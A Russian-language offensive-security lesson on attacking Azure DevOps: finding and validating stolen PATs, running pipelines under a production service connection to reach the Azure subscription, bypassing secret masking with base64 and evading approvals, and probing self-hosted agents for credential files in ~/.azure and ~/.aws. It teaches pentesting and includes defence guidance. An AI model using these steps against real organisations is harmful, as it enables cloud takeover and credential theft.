---
id: cloud-azure-devops
title: "Azure DevOps: pipelines, service connections и PAT"
category: cloud
parent: cloud-azure-data-deep
difficulty: hard
order: 1
tags: [cloud, azure, devops, pipelines, service-connection, pat, agent]
prerequisites: [cloud-azure-data-deep, cloud-cicd-secrets]
useful_for:
  - "Атаки на Azure DevOps"
  - "Кража service connections и PAT"
  - "RCE на агентах сборки"
estimated_minutes: 50
summary: "Azure DevOps: Pipelines, variable groups, service connections, agent pools и PAT. Как из сборки получить креды к подписке Azure и всей организации."
---

## Зачем этот урок

Azure DevOps (ADO) — платформа CI/CD Microsoft, тесно интегрированная с Entra ID и Azure. Service connections хранят креды к подпискам (service principal или managed identity), а PAT-токены дают доступ ко всей организации. Компрометация ADO часто означает доступ к production-подписке: пайплайн исполняет код на агенте, у которого есть service connection. Это один из самых прямых путей от «сборки» к «администратору Azure».

## Модель Azure DevOps

- **Organization → Projects → Repos/Pipelines/Artifacts**.
- **Pipeline** — YAML или classic; исполняется на **agent** (Microsoft-hosted или self-hosted).
- **Variable group** — набор переменных, часто со ссылкой на Key Vault. Секретные переменные скрыты в логах, но доступны процессу.
- **Service connection** — креды к Azure/внешним сервисам; тип: service principal (secret/certificate), managed identity, workload identity federation.
- **Agent pool** — self-hosted агенты (на VM/контейнере) с доступом к сети организации.
- **PAT** — personal access token с scope'ами (build, release, code, graph); живёт до года.
- **Environments / approvals** — контроль развёртывания.

## Инструменты и команды

```bash
# Инвентаризация через az devops CLI
az devops configure --defaults organization=https://dev.azure.com/ORG project=PROJ
az devops project list --query 'value[].name'

# Репозитории и pipelines
az repos list --query '[].{Name:name,Id:id}'
az pipelines list --query '[].{Name:name,Id:id}'

# Service connections
az devops service-endpoint list --query '[].{Name:name,Type:type,Url:url}'
az devops service-endpoint show --id <id> --query 'authorization'

# Variable groups
az pipelines variable-group list --query '[].{Name:name,Id:id}'
az pipelines variable-group show --group-id <id>

# PAT через REST
curl -s -u :$PAT "https://dev.azure.com/ORG/_apis/projects?api-version=7.0" | jq '.value[].name'
```

## Разобранный пример: PAT → service connection → подписка

Сценарий: в логах/репозитории найден PAT с scope'ами `Build (read, execute)`, `Service Endpoints (read, use)`.

```bash
# 1. Проверяем PAT
export PAT="xxxx"
curl -s -u :$PAT "https://dev.azure.com/ORG/_apis/projects?api-version=7.0" | jq -r '.value[].name'
# prod-app
# infra

# 2. Находим service connection к Azure
curl -s -u :$PAT "https://dev.azure.com/ORG/PROJ/_apis/serviceendpoint/endpoints?api-version=7.1-preview.4" \
  | jq '.value[] | {name:.name,type:.type}'
# {"name":"azure-prod","type":"azurerm"}

# 3. Создаём pipeline, который использует этот service connection
cat > azure-pipelines.yml <<'YAML'
trigger: none
pool: { vmImage: 'ubuntu-latest' }
steps:
  - task: AzureCLI@2
    inputs:
      azureSubscription: 'azure-prod'
      scriptType: bash
      scriptLocation: inlineScript
      inlineScript: |
        az account show
        az role assignment list --all --assignee $(az account show --query user.name -o tsv)
YAML

# 4. Запускаем и читаем лог
az pipelines run --name azure-pipelines.yml --branch main
```

Если PAT позволяет создавать/запускать пайплайны, вы выполняете код на агенте с правами service connection — то есть в подписке. Дальше — перечислить права, читать Key Vault, создавать ресурсы.

## Variable groups и Key Vault

Variable groups часто ссылаются на Azure Key Vault: секреты подтягиваются в пайплайн. Если у вас есть доступ к переменным, вы получаете эти секреты в логах процесса (если не скрыты) или через `##vso`-команды.

```bash
# Смотрим переменные группы
az pipelines variable-group show --group-id 1 --query 'variables'
# {"DB_PASSWORD":{"isSecret":true,"value":null},"API_URL":{"value":"https://..."}}
```

Секретные переменные не показываются через API, но доступны процессу. Чтобы их извлечь, нужен запуск пайплайна с `echo`/выгрузкой — либо доступ к self-hosted агенту, где переменные лежат в окружении процесса.

## Self-hosted агенты и RCE

Self-hosted агенты — часто обычные VM в корпоративной сети с установленным агентом. Если у вас есть права на pool, вы можете зарегистрировать агент или запустить job на существующем — и получить выполнение в сети организации. Агент работает под сервисным аккаунтом, часто с широкими правами.

## Чек-лист атаки

1. Искать PAT в репозиториях, логах, `.env`, истории.
2. Перечислить проекты, repos, pipelines, service connections.
3. Проверить права PAT: создание/запуск пайплайнов.
4. Запустить пайплайн с service connection и получить токен подписки.
5. Проверить variable groups (Key Vault links).
6. Проверить self-hosted агенты и их сеть.
7. Проверить `Environments`/approvals: можно ли обойти.

## Обход защит и edge cases

- **Approvals.** Environment может требовать approval; обход — параллельные стадии без approval, или другой pipeline.
- **PAT scopes.** PAT может быть ограничен; проверяйте, какие scope'ы реально есть.
- **Secret masking.** Секреты маскируются в логах; обход — base64/шифрование перед выводом (как в примере).
- **Branch policies.** Может требоваться PR; обход — если есть права на push в main или на изменение политик.
- **Microsoft-hosted agents.** Не имеют доступа в вашу сеть, но имеют выход в интернет и service connection.
- **Federated credentials.** Workload identity federation для service connection без секретов; проверяйте условия доверия.

## Частые ошибки и подводные камни

- Считать ADO «просто репозиторием» и не проверять service connections.
- Игнорировать PAT как полноценный билет.
- Не проверить variable groups с Key Vault.
- Забыть про self-hosted агенты как точку входа в сеть.
- Не проверить branch policies и approvals.

## Защита и детект

- Least privilege для PAT и service connections; короткий срок жизни.
- Использовать workload identity federation вместо секретов.
- Ограничить создание/запуск пайплайнов; требовать approvals для prod.
- Аудит доступа к ADO (audit log), алертить на создание service connection/PAT.
- Изолировать self-hosted агенты; не давать им широких прав.

## Модель угроз и типовые мисконфиги

Типичный мисконфиг — PAT с широкими scope'ами в репозитории. Второй — service connection с Contributor на подписку. Третий — секреты в variable group без Key Vault. Четвёртый — self-hosted агент с доступом в сеть. Пятый — отсутствие approvals. Все они ведут к доступу в Azure.

## Практическое задание

1. Создайте ADO-проект, service connection к Azure и пайплайн.
2. Запустите пайплайн с `AzureCLI` и посмотрите, какие права у connection.
3. Создайте PAT и проверьте его scope'ы.
4. Настройте approval для environment и проверьте блокировку.

## Что дальше / решение

Из ADO получаем токен подписки Azure. Дальше — перечислять права, читать секреты, эскалировать. Зафиксируйте путь «PAT → service connection → подписка» в графе. Если approvals блокируют — ищите другие пайплайны или агенты.

## Безопасность агентов и сетевой доступ

Self-hosted агенты — это машины в вашей сети, часто с широким сетевым доступом и сервисным аккаунтом. Microsoft-hosted агенты изолированы, но self-hosted — нет.

```bash
# Список agent pools и агентов
az pipelines pool list --query '[].{Name:name,Type:type,Agents:agentCount}'
az pipelines agent list --pool-id 1 --query '[].{Name:name,Version:version,Status:status}'

# Проверяем, на какой машине работает агент (если получили код на нём)
hostname; whoami; ip a
cat /etc/hosts
ls ~/.azure ~/.aws ~/.config/gcloud 2>/dev/null
```

Если вы получили выполнение на self-hosted агенте, вы находитесь в корпоративной сети: доступны внутренние API, базы, другие сервисы. Часто на агенте лежат кеши других пайплайнов, `.env`-файлы и даже ключи SSH. Агент может работать под аккаунтом с доступом к Azure (managed identity VM) — проверьте IMDS. Это делает ADO одним из лучших мостов из CI во внутреннюю сеть.

## Квиз

```quiz
- question: "Что хранит Azure DevOps service connection?"
  options:
    - "Креды (service principal/managed identity) к Azure или внешнему сервису"
    - "Только имя проекта"
    - "Логи пайплайна"
    - "DNS-записи"
  answer: 0
  explanation: "Service connection аутентифицирует пайплайн в целевой подписке."
- question: "Почему PAT опасен?"
  options:
    - "Даёт доступ к организации с заданными scope'ами (build, code, service endpoints)"
    - "Только для чтения кода"
    - "Истекает через час"
    - "Требует MFA"
  answer: 0
  explanation: "PAT — долгоживущий токен с набором прав на организацию."
- question: "Зачем атакующему self-hosted агент?"
  options:
    - "Выполнение кода в корпоративной сети под сервисным аккаунтом"
    - "Только сборка кода"
    - "Шифрование"
    - "Биллинг"
  answer: 0
  explanation: "Self-hosted агент часто имеет доступ в сеть и широкие права."
- question: "Как обойти маскирование секретов в логах ADO?"
  options:
    - "Закодировать/зашифровать значение перед выводом"
    - "Секреты не маскируются"
    - "Использовать SSH"
    - "Отключить KMS"
  answer: 0
  explanation: "Маскирование ищет точное значение; base64 обходит его."
```

## Где пригодится

- **Пентест Azure:** путь от CI к подписке.
- **Red team:** кража service connections.
- **Blue team:** аудит PAT и connections.
- **Сертификация:** AZ-400 / AZ-500.
